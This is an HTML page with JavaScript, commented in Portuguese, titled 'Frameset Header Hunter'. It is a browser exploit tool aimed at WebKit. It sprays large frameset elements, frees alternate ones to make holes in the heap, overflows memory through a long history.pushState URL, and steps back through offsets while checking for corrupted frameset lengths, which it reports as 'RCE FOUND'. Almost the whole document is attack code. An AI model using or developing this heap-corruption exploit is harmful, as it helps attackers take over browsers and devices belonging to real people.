<!DOCTYPE html>
<html>
<head>
    <title>Frameset Header Hunter</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
        #status { 
            font-size: 40px; border: 2px solid #0f0; padding: 20px; margin: 20px; background: #111; 
        }
        button { 
            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #222; color: #fff; cursor: pointer; 
        }
        #log { text-align: left; margin-top: 20px; color: cyan; height: 300px; overflow-y: auto; border: 1px solid #333; padding: 10px;}
        .win { background-color: #0f0; color: #000; font-weight: bold; }
    </style>
</head>
<body>

    <h1>Frameset Header Hunter</h1>
    <p>Recuando de 709520 para achar o cabeçalho '_size' do Frameset.</p>

    <div id="status">PRONTO</div>
    <button onclick="startHunt()">INICIAR CAÇADA</button>
    
    <div id="log">Log de eventos...</div>

    <script>
        // INÍCIO: Ponto onde sabemos que os dados começam
        let currentOffset = 709520; 
        const END_OFFSET = 709400; // Limite de segurança
        
        const OVERFLOW_AMT = 1024 * 64; 

        // CÁLCULO DO FRAMESET 1MB
        // Total 1MB (1048576) - 8 bytes (_size) = 1048568 bytes de dados
        // Cada Length = 8 bytes.
        // Elementos = 131071.
        const TARGET_BYTES = 1024 * 1024;
        const ELEMENT_COUNT = (TARGET_BYTES - 8) / 8;
        const ROWS_STRING = ",".repeat(ELEMENT_COUNT - 1);

        var victims = [];
        var isRunning = false;

        function log(msg, type) {
            const el = document.getElementById('log');
            let style = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${style}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        function updateStatus(msg) {
            document.getElementById('status').innerText = msg;
        }

        async function startHunt() {
            if(isRunning) return;
            isRunning = true;

            // Loop de recuo (8 em 8 bytes, pois Length é 64-bit)
            while(currentOffset >= END_OFFSET && isRunning) {
                
                updateStatus(`TESTANDO: ${currentOffset}`);
                await new Promise(r => setTimeout(r, 50)); // Render UI

                victims = [];
                await forceGC();

                try {
                    // 1. SPRAY (Framesets de 1MB)
                    const SPRAY_COUNT = 60;
                    for(let i=0; i<SPRAY_COUNT; i++) {
                        let fset = document.createElement('frameset');
                        fset.rows = ROWS_STRING;
                        victims.push(fset);
                    }

                    // 2. BURACOS
                    for(let i=0; i<SPRAY_COUNT; i+=2) {
                        victims[i].rows = ""; 
                        victims[i] = null;
                    }
                    await forceGC();

                    // 3. EXPLOIT
                    let buffer = "A".repeat(currentOffset);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.pushState({}, "hunt_" + currentOffset, "/" + buffer);

                    // 4. CHECAGEM (OOM Detector)
                    if (checkVictims()) {
                        isRunning = false;
                        return; // VENCEU!
                    }

                } catch(e) {
                    log(`Erro no ciclo ${currentOffset}: ${e.message}`);
                }

                // Recua 8 bytes para a próxima tentativa
                currentOffset -= 8;
                
                // Pausa para estabilidade
                await new Promise(r => setTimeout(r, 200));
            }
            log("Fim da caçada. Nenhum alvo atingido.");
        }

        function checkVictims() {
            for(let i=1; i<victims.length; i+=2) {
                let fset = victims[i];
                if(!fset) continue;

                try {
                    // Tenta ler .rows
                    // Se o tamanho foi corrompido, o WebKit tenta criar string gigante
                    // e falha com erro de memória.
                    let s = fset.rows;
                    
                    // Se leu com sucesso e o tamanho mudou drasticamente
                    if (s.length !== ROWS_STRING.length) {
                         log(`!!! JACKPOT !!! Frameset ${i} Length: ${s.length}`, 'win');
                         alert(`RCE FOUND AT OFFSET ${currentOffset}!`);
                         return true;
                    }

                } catch(e) {
                    // SE DER ERRO, É SINAL DE SUCESSO!
                    log(`!!! SUCESSO (ERRO) !!! Vítima ${i} estourou memória ao ler!`, 'win');
                    log(`Offset Mágico: ${currentOffset}`, 'win');
                    alert(`RCE FOUND (OOM TRIGGER) AT ${currentOffset}!`);
                    return true;
                }
            }
            return false;
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 500));
        }
    </script>
</body>
</html>
